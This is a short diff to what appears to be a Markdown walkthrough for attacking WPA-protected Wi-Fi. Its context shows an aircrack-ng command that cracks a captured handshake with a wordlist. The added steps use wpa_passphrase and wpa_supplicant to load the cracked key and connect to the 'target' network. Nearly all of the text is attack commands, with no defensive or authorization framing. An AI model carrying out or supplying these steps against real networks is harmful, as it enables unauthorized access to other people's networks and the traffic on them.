@@ -55,3 +55,13 @@
     aircrack-ng -w WORDLIST.TXT -b BSSID CAPTURE_FILE 
     
   (Crack WPA Handshake)
+
+#### 8) 
+
+    wpa_passphrase TARGET_SSID 'ENTER PSK HERE' > config
+
+#### 9) 
+
+    sudo wpa_supplicant -B -c config -i WIRELESS_INTERFACE
+
+(Supply the cracked PSK, then connect to the target Wi-Fi)
